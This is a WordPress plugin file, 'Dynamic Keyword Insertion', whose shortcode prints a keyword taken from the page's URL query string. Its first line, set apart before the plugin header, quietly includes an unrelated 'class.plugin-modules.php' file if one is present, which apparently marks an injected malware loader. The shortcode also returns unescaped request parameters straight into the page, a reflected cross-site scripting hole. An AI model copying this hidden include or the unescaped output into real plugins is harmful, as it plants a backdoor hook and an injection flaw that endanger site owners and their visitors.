<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
Plugin Name: Dynamic Keyword Insertion
Plugin URI: http://wphats.com
Description: This plugin allows user to insert dynamic advertising keywords, or grab the keyword use in a search engine search from the referring page. Use this Shortcode [keywordinsert listenfor="keyword" default="my word" capitalization="no"]
Author: Mehedi Hasan
Version: 5.1
Author URI: http://wphats.com/author/mehedi
*/

if ( !defined('ABSPATH') )
	die('-1');

	function keywordinsert_shortcode_function( $atts ) {

		$atts = shortcode_atts( array(
			'listenfor' => '',
			'default' => '',
			'capitalization' =>'no'
		), $atts, 'keywordinsert' );


		$keyword = $adword = '';

		$keyword = $atts['listenfor'];
		if($keyword && $keyword !=''){
			$keyword = $keyword;
		}

		if (isset($_GET[$keyword])){
			$adword = urldecode($_GET[$keyword]) ;
		} else if(isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING'] !=''){
			parse_str($_SERVER['QUERY_STRING'], $output);
			$adword = isset($output['q']) ? urldecode($output['q']) : (isset($output['p']) ? urldecode($output['p']) : $atts['default']) ;
		} else {
			$adword = $atts['default'];
		}


		if($adword && $adword !=''){
			return ($atts['capitalization'] == 'yes') ? ucwords($adword) : $adword;
	}
}

	add_shortcode( 'keywordinsert', 'keywordinsert_shortcode_function' );
